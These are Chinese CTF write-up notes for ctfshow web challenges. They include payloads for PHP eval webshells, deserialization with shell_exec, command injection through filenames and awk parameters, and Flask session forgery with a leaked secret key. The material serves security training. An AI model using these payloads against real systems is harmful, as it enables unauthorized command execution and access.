# web签到
```php
eval($_REQUEST[$_GET[$_POST[$_COOKIE['CTFshow-QQ群:']]]][6][0][7][5][8][0][9][4][4]);
/*
    # $_REQUEST 能够获取get，post，cookie中的消息
    # $_COOKIE 获取cookie中的值，此题中获取CTFshow-QQ群的值
    # $_POST 获取cookie的名的值
    # $_GET 获取post对应的值
*/
```
构造如下请求（不知道request c[][]...[]=system('ls /');命令放在get处无法执行。。。，改到post处就可以）
![pic1](/ctfshow/image/image-1.png)

# web2 come_to_sign
浏览器f12，按照提示控制台输入g1ve_flag()

# 我的眼里只有$
```php
$var = str
$str = hello
$$var = $str = hello
```
![image2](/ctfshow/image/image-2.png)

# 抽老婆
打开网站，发现可以下载图片，修改download的请求，报错
![error](/ctfshow/image/image-3.png)
发现报错处为/app/app.py,尝试download该文件，打开发现secret_key
并且发现如下代码
```python
@app.route('/secret_path_U_never_know',methods=['GET'])
def getflag():
    if session['isadmin']:
        return jsonify({"msg":flag})
    else:
        return jsonify({"msg":"你怎么知道这个路径的？不过还好我有身份验证"})
```
使用脚本解密session，修改isadmin的值为True，重新加密生成session
![alt text](/ctfshow/image/image-5.png)
![alt text](/ctfshow/image/image-4.png)

# 一言既出&驷马难追
xor

114514^1897488

# TapTapTap
修改游戏代码，habibiscript.js,跳关，小球点击次数改为一，depends on you

# webshell
php的序列化和反序列化，<mark>由于有shell_exec就不用system了</mark>
```php
$cmd=O:8:"Webshell":1:{s:3:"cmd";s:4:"nl *";}
```
# 化整为零
构造payload ?1=%E5&2=%A4&3=%A7&4=%E7&5=%89&6=%9B

# 无一幸免
题出错了?，退测if中应该为==

# 传说之下（雾）
在控制台修改

# 算力超群
看了wp要用反弹shell，没有公网ip

# 算力升级
没做还

# easyPytHon_P
给了源码还是得看wp，cmd=awk&param=system("ls")

<mark>有的地方不用双引号不行不知道为什么</mark>

# 遍地飘零
var_dump($_GET)

尝试把\$flag的值赋给\$_GET

# 茶歇区
溢出，源码判断数量\*消耗fp值要小于等于剩余fp值，类型为int64，故使得数量\*消耗的fp大于int64的上限变为复数即可，然后再次输入使数量\*消耗fp值\*2的符号位为0，且值大于114514即可

# 小舔田
php __wakeup()函数在unserialize时被自动调用
```php
<?php
    class Ion_Fan_Princess{
        public $nickname="小甜甜";

        public function call(){
            global $flag;
            if ($this->nickname=="小甜甜"){
                echo $flag;
            }else{
                echo "以前陪我看月亮的时候，叫人家小甜甜！现在新人胜旧人，叫人家".$this->nickname."。\n";
                echo "你以为我这么辛苦来这里真的是为了这条臭牛吗?是为了你这个没良心的臭猴子啊!\n";
            }
        }
        
        public function __toString(){
            $this->call();
            return "\t\t\t\t\t\t\t\t\t\t----".$this->nickname;
        }
    }
    class Moon{
        public $name="月亮";
        public function __toString(){
            return $this->name;
        }
        
        public function __wakeup(){
            echo "我是".$this->name."快来赏我";
        }
    }
    // $m->(此处不用加$)name
    $m = new Moon();
    $m->name=new Ion_Fan_Princess();
    $m->name->nickname='小甜甜';
    echo urlencode(serialize($m));
?>
```

# LSB探姬
源码中直接将文件名拼接到指令中执行，故修改文件名即可，例如：steg.png;ls

# Is_Not_Obfuscate
## step1
乱点一通，什么都没发现
## step2
F12查看页面,发现有两处注释，第一处看不明白，第二处提到了lip.php,robots.txt

![alt text](/ctfshow/image/image-6.png)

分别查看，发现lib.php什么都不显示，robots.txt有如下内容
```
User-agent: *
Allow: /lib.php$
Disallow: /lib.php?flag=0
Disallow: /plugins
```
重新查看lib.php$,和index.php没什么不同

不让flag=0，试试flag=1，页面出现了一串字符串

之前的第一处注释中发现action有个值为test，此处看了wp，将action=test和push=urlencode（上面的字符串）

出现了页面源码

发现push提交的命令和‘youyou’拼接后md5加密作为插件名，因此
```
push <?php system('ls');?>
pull md5 encode("<?php system('ls');?>youyou")
```

